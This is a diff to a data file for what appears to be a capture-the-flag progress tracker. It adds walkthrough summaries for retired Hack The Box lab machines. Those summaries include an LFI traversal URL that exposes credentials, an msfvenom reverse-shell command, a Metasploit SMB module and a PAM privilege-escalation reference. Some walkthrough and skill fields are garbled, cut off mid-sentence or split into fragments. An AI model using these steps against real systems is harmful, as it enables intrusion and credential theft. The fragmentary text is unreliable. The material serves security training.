     "roomUrl": "https://app.hackthebox.com/machines/beep",
     "writeupUrl": "https://0xdf.gitlab.io/tags#beep",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-03-14T22:45:43.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10873,7 +13704,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.",
+    "skillsLearned": [
+      "based fuzzing",
+      "Identifying known exploits",
+      "Exploiting local file inclusion",
+      "vulnerabilities"
+    ],
+    "officialPdf": "5-Beep_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBeep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.\n\n### 🎯 Core Skills\n- **based fuzzing**\n- **Identifying known exploits**\n- **Exploiting local file inclusion**\n- **vulnerabilities**\n\n### ⚔️ Foothold Vector\nExploit: https://www.exploit-db.com/exploits/37637/ Browsing to the main web directory reveals a copy of Elastix. Some searching finds a local file inclusion vulnerability for Elastix 5.3.0 and 5.4.0; Exploit-DB 37637. The proof of concept is extremely simple. Browsing to https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf% 00&module=Accounts&action will expose the credentials for AMPortal. The machine is vulnerable to password reuse, and it is possible to SSH in directly as the\n\n### 👑 Privilege Escalation\nuser with the AMPDBPASS password. The flags can be obtained from /home/fanis/user.txt and /root/root.txt"
   },
   {
     "id": "htb-popcorn",
@@ -10884,15 +13724,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Modifying-HTTP-requests"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/popcorn",
     "writeupUrl": "https://0xdf.gitlab.io/tags#popcorn",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-03-14T22:45:42.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation.",
+    "skillsLearned": [
+      "Bypassing file upload checks",
+      "Modifying HTTP requests"
+    ],
+    "officialPdf": "4-Popcorn_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPopcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation.\n\n### 🎯 Core Skills\n- **Bypassing file upload checks**\n- **Modifying HTTP requests**\n\n### ⚔️ Foothold Vector\n. Skills Required ● Basic knowledge of Linux ● Enumerating ports and services Skills Learned ● Bypassing file upload checks ● Modifying HTTP requests\n\n### 👑 Privilege Escalation\nExploit: https://www.exploit-db.com/exploits/14339/ Using ls -lAR /home/george reveals an uncommon file (motd.legal-displayed) in the .cache directory. A bit of research finds Exploit-DB 14339, and it appears that PAM 1.1.0 has a file tampering privilege escalation vulnerability. From here, it is possible to execute the script on the target machine to get root privileges. Note that a semi-interactive shell is required, which can be acquired by running the command python -c 'import pty; pty.spawn(\"/bin/sh\")' in the non-interactive shell. The root flag can be obtained from /root/root.txt"
   },
   {
     "id": "htb-devel",
@@ -10903,12 +13751,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/devel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#devel",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-03-14T22:45:40.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10917,7 +13766,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Exploiting weak credentials",
+      "Basic Windows privilege escalation",
+      "techniques"
+    ],
+    "officialPdf": "3-Devel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDevel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Exploiting weak credentials**\n- **Basic Windows privilege escalation**\n- **techniques**\n\n### ⚔️ Foothold Vector\nWithout any detailed version information on the Microsoft FTP server, it will need to be approached differently. In this case, the most likely entry method appears to be a misconfiguration or weak login credentials. Attempting to connect anonymously via FTP reveals that the server does allow anonymous login with read/write privileges in the IIS server directory. Armed with the ability to upload files, it is possible to drop an aspx reverse shell on the target and execute it by browsing to the file via the web server. The following command will create the aspx file: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > devel.aspx"
   },
   {
     "id": "htb-legacy",
@@ -10928,12 +13786,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "CVE-2008-4250",
+      "Exploiting-SMB",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/legacy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#legacy",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-03-14T22:45:38.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10942,7 +13802,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Exploiting SMB"
+    ],
+    "officialPdf": "2-Legacy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLegacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Exploiting SMB**\n\n### 🛡️ Associated CVEs\n`CVE-2008-4250`\n\n### ⚔️ Foothold Vector\nSome searching turns up with CVE-2008-4250, which also has a Metasploit module available for it. Running the module immediately grants a\n\n### 👑 Privilege Escalation\nshell. Note: in some cases the module target must be set for the exploit to work. If so, Windows XP SP3 English is the correct target. Module: exploit/windows/smb/ms08_067_netapi The user flag can be obtained from C:\\Documents and Settings\\john\\Desktop\\user.txt and the root flag from C:\\Documents and Settings\\Administrator\\Desktop\\root.txt"
   },
   {
     "id": "htb-lame",
@@ -10953,12 +13820,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "CVE-2007-2447",
+      "Exploiting-Samba",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/lame",
     "writeupUrl": "https://0xdf.gitlab.io/tags#lame",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-03-14T19:54:51.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10967,7 +13836,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Exploiting Samba"
+    ],
+    "officialPdf": "1-Lame_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nLame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Exploiting Samba**\n\n### 🛡️ Associated CVEs\n`CVE-2007-2447`\n\n### ⚔️ Foothold Vector\nExploitation is trivial on this machine. After attempting (and failing) to enter using the \"obvious\" vsftpd attack vector, Samba becomes the only target. Using CVE-2007-2447, which conveniently has a Metasploit module associated with it, will immediately grant a\n\n### 👑 Privilege Escalation\naccess. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. Skills Required ● Basic knowledge of Linux ● Enumerating ports and services Skills Learned ● Identifying vulnerable services ● Exploiting Samba"
   },
   {
     "id": "thm-crackthehash",
@@ -14641,7 +17517,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://tryhackme.com/room/squidgameroom",
     "writeupUrl": "",
-    "hint": "\uc624\uc9d5\uc5b4 \uac8c\uc784",
+    "hint": "오징어 게임",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z"
@@ -16068,7 +18944,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://tryhackme.com/room/lookback",
     "writeupUrl": "",
-    "hint": "You\u2019ve been asked to run a vulnerability test on a production environment.",
+    "hint": "You’ve been asked to run a vulnerability test on a production environment.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z"
@@ -16895,7 +19771,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://tryhackme.com/room/avenger",
     "writeupUrl": "",
-    "hint": "You\u2019ve been asked to exploit all the vulnerabilities present.",
+    "hint": "You’ve been asked to exploit all the vulnerabilities present.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z"
@@ -17155,7 +20031,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://tryhackme.com/room/exfilibur",
     "writeupUrl": "",
-    "hint": "You\u2019ve been asked to exploit all the vulnerabilities present.",
+    "hint": "You’ve been asked to exploit all the vulnerabilities present.",
     "timeSpentSeconds": 0,
     "createdAt": "2024-01-01T00:00:00.000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z"
